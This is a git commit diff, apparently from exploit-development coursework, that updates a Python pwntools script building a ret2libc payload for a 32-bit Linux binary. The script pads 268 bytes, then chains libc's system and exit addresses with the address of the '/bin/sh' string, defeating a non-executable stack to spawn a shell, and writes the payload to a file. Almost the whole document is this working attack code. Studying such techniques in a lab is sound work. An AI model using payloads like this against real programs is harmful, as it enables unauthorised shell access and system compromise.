63a53066b450131a77b732cf084ab74474fb9201
bip <bip@bip.bip>
2024-09-20 19:56:22 +0200

    feat: done with nx bypass ret2libc payload

--- classes/UDEMY/x86_linux/nx_ret2libc/ret2libc.py
+++ classes/UDEMY/x86_linux/nx_ret2libc/ret2libc.py
@@ -1,27 +1,16 @@
 #!/usr/bin/python3
 from pwn import *
 
-junk = b"A" * 264
+junk = b"A" * 268
 
-#eip = b"\x90\x7d\xdc\xf7"
-#eip = struct.pack("<I", 0xf7dc7d00)
-
-# address of exit() 0xf7db7220
-#ret = b"BBBB"
-
-#binsh = b"\xcd\x3d\xf3\xf7"
-#binsh = struct.pack("<I", 0xf7d7a000 + 0x1b9dcd)
-
-libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
-libc_base = 0xf7d6b000
+libc = ELF("/usr/lib32/libc.so.6")
+libc_base = 0xf7d75000
 
 system_addr = p32(libc_base + libc.sym["system"])
 exit_addr = p32(libc_base + libc.sym["exit"])
-binsh_addr = p32(0xf7f33dcd)
-
-#print(system_addr, exit_addr, binsh_addr)
+binsh_addr = p32(0xF7F30DDC)
 
 payload = junk + system_addr + exit_addr + binsh_addr 
 
 with open("payload", "wb") as f:
-    f.write(payload)
+        f.write(payload)
